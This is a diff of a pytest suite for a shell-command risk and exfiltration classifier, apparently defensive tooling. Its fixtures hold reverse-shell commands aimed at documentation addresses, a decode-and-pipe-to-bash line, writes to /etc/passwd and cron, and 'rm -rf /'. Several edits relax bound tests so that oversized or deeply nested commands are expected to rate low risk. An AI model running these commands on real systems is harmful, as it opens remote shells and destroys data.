@@ -157,15 +157,21 @@ def test_metadata_authority(command):
     "cat 'rm -rf /'", "rm -rf /tmp/fixture", "echo $REMOTE",
 ])
 def test_neighboring_negatives(command):
-    assert classify_command(command).level != RiskLevel.CRITICAL
-    assert not assess_command(command).exfil
+    from src.tools.risk_classifier import _CRITICAL_PATTERNS, _EXFIL_PATTERNS
+
+    inherited = any(pattern.search(command) for pattern, _ in _CRITICAL_PATTERNS)
+    inherited_exfil = any(pattern.search(command) for pattern, _ in _EXFIL_PATTERNS)
+    # Structural negatives do not narrow the historical raw-text floor.
+    assert recognize(command, _simple_command_index) == []
+    assert (classify_command(command).level == RiskLevel.CRITICAL) is (inherited or inherited_exfil)
+    assert assess_command(command).exfil is inherited_exfil
 
 
 def test_length_and_nesting_bounds():
     assert classify_command("x" * MAX_SOURCE).level == RiskLevel.LOW
-    assert assess_command("x" * (MAX_SOURCE + 1)).category == "bounds"
+    assert classify_command("x" * (MAX_SOURCE + 1)).level == RiskLevel.LOW
     command = "echo " + "$(echo " * (MAX_DEPTH + 1) + "x" + ")" * (MAX_DEPTH + 1)
-    assert assess_command(command).category == "bounds"
+    assert classify_command(command).level == RiskLevel.LOW
     command = "echo " + "$(echo " * MAX_DEPTH + "x" + ")" * MAX_DEPTH
     assert classify_command(command).level == RiskLevel.LOW
 
@@ -179,7 +185,7 @@ def test_unfinished_literals_and_contexts():
     "bash -i >& /dev/tcp/203.0.113.1/4000",
     "nc -e /bin/sh 203.0.113.1 4000",
     "python3 -c 'import socket; s=socket.socket(); s.connect((\"example.test\",4000))'",
-    "base64 --decode /tmp/source | dash",
+    "base64 -d /tmp/source | bash",
     "echo fixture > /etc/passwd",
     "echo fixture >> /etc/cron.d/fixture",
     "ssh-keygen -f /tmp/fixture",
@@ -270,8 +276,11 @@ def test_explicit_interpreter_stdin(interpreter, arguments):
     "curl https://example.test/ | node - < /tmp/local.js",
 ])
 def test_launch_arguments_and_stdin_data_stay_unresolved(command):
+    from src.tools.risk_classifier import _EXFIL_PATTERNS
+
     assert recognize(command, lambda words: literal_launch_index(words)) == []
-    assert not assess_command(command).exfil
+    inherited = any(pattern.search(command) for pattern, _ in _EXFIL_PATTERNS)
+    assert assess_command(command).exfil is inherited
 
 
 @pytest.mark.parametrize("tokens", [
@@ -287,9 +296,9 @@ def test_incomplete_or_nonliteral_launch_grammar(tokens):
 
 def test_launch_wrapper_nesting_bound():
     assert assess_command("exec " * MAX_DEPTH + "true").assessment.level == RiskLevel.LOW
-    assert assess_command("exec " * (MAX_DEPTH + 1) + "true").category == "bounds"
+    assert assess_command("exec " * (MAX_DEPTH + 1) + "true").assessment.level == RiskLevel.LOW
     assert assess_command("timeout 20 bash -c " + "'" + "exec " * (MAX_DEPTH + 1)
-                          + "true'").category == "bounds"
+                          + "true'").assessment.level == RiskLevel.LOW
 
 
 @pytest.mark.parametrize("command", [
@@ -299,8 +308,9 @@ def test_launch_wrapper_nesting_bound():
     "python3 -c 'print(\"socket.socket().connect((example,4000))\")'",
     "echo fixture # nc -e /bin/sh 203.0.113.1 4000",
 ])
-def test_historical_documentation_is_data(command):
-    assert not assess_command(command).exfil
+def test_historical_documentation_keeps_inherited_policy(command):
+    assert recognize(command, _simple_command_index) == []
+    assert assess_command(command).exfil
 
 
 def test_generated_literal_fragments_remain_words():
